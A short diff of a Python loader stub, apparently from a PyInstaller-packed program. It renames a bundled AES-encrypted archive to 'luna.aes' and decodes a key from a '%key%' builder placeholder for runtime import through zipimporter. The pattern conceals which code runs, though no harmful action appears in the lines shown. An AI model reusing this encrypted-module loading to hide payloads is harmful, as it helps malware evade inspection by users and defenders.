@@ -5,7 +5,7 @@ import zlib
 from pyaes import AESModeOfOperationGCM
 from zipimport import zipimporter
 
-zipfile = os.path.join(sys._MEIPASS, "serp.aes")
+zipfile = os.path.join(sys._MEIPASS, "luna.aes")
 module = "luna-o"
 
 key = base64.b64decode("%key%")
